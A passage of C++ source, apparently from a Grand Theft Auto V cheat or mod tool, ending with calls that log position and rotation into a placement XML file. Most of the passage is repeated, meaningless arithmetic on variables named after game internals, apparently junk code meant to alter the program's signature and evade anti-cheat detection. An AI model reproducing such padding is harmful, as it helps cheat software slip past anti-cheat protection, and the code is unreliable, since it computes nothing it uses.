			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<PositionRotation>");
			Extern_Reader::LOG::LogSemHora("<X>" + to_string(Estrutura.PosX) + "</X>");
			Extern_Reader::LOG::LogSemHora("<Y>" + to_string(Estrutura.PosY) + "</Y>");
			Extern_Reader::LOG::LogSemHora("<Z>" + to_string(Estrutura.PosZ) + "</Z>");
			Extern_Reader::LOG::LogSemHora("<Pitch>" + to_string(Estrutura.PosZ) + "</Pitch>");
			Extern_Reader::LOG::LogSemHora("<Roll>" + to_string(Estrutura.PosZ) + "</Roll>");
			Extern_Reader::LOG::LogSemHora("<Yaw>" + to_string(Estrutura.PosZ) + "</Yaw>");
			Extern_Reader::LOG::LogSemHora("</PositionRotation>");
			Extern_Reader::LOG::LogSemHora("<Attachment isAttached=\"false\" />");
			Extern_Reader::LOG::LogSemHora("</Placement>");
		}
		void FinalizarXML()
		{

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
